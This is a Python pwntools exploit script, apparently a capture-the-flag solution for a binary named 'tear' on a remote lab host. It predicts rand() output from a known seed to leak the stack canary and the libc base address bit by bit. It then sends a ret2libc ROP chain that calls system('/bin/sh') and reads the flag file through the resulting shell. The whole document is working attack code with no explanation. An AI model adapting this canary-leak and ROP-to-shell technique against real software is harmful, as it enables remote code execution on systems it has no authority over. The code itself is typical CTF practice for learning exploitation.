from pwn import *
from ctypes import CDLL
#io = process("./tear",aslr=True)
io = remote("10.100.0.43",10002)
libc = ELF("./libc.so.6")
cdll_libc = CDLL('libc.so.6')
cdll_libc.srand(0x7b534341)

def brute_bit(s):
    # to use this func, bit alr has to be setup
    # only DONT change MSB
    state = s
    cur_rand = cdll_libc.rand()
    target = cur_rand & 0x7fffffff 
    state = (state&0x7fffff00) + ord('?') 
    diff = abs(target-state)    

    if (target > state):
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"?") # to choose back guess
        io.sendlineafter(b"choice",b"+")
        io.sendlineafter(b"plus...?",str(diff).encode())
    
    else:
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"?")
        io.sendlineafter(b"choice",b"-")
        io.sendlineafter(b"minus...?",str(diff).encode())

    resp = io.recvuntil(b"..")
    if b"wow" in resp:
        # bit matches the rand
        io.sendline(b"2069054273")
    
        # have to do this for some reason
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",b"A")
        io.sendlineafter(b"choice",b"-")
        cdll_libc.rand() 
        
        return cur_rand >> 31

    else:
        # bit does not match the rand
        return not (cur_rand >> 31)


def brute_qword(idx,start_bit,end_bit,known=0):
    # brute start bit - end bit, inclusive
    qword = known

    for i in range(start_bit,end_bit+1):
        # load the ptr we want to leak
        # multiply 2**n shift n bytes to left
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",idx.to_bytes(1,"little"))
        io.sendlineafter(b"choice",b"*")
        io.sendlineafter(b"multiply...?",str(2**(31-i)).encode())
        cdll_libc.rand() 

        new_bit = brute_bit(qword << (31-i))
        qword = (new_bit<<i) + qword

    log.info("QWORD BRUTED")
    return qword


canary = (brute_qword(0xc,0,31)<<32) + (brute_qword(0xb,8,31))
log.info("CANARY: " + hex(canary))

libc.address = (brute_qword(0x1c,0,15)<<32) + brute_qword(0x1b,8,31,known=0xe3) - libc.symbols["_IO_file_overflow"] - 259
log.info("LIBC BASE: " + hex(libc.address))

pop_rdi = p64(libc.address + 0x10f75b)
ret = p64(libc.address + 0x10f75c)

ret2libc = b"A"*0x108 + p64(canary) + p64(0) + ret
ret2libc +=  pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])

io.sendlineafter(b"relieved.",b"102")
io.sendlineafter(b"skill.",ret2libc)

io.sendline(b"cat /home/acs_ctf/flag")
io.interactive()
